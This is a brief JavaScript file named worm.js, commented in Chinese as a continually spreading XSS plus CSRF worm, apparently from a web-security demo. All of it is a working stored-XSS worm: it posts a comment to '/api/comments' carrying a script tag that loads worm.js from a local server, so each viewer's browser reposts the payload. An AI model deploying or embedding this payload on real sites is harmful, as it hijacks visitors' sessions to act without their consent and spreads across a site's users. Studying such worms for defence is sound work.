// xss+csrf(蠕虫)
// 不断传播的xss+csrf攻击 worm.js
console.log("-----------------------worm.js----------------------");
const attack = '<script src="http://127.0.0.1:3001/worm.js"></script>';
$.post('/api/comments', {
    content: 'haha' + attack
}).then(data => {
    console.log(data);
});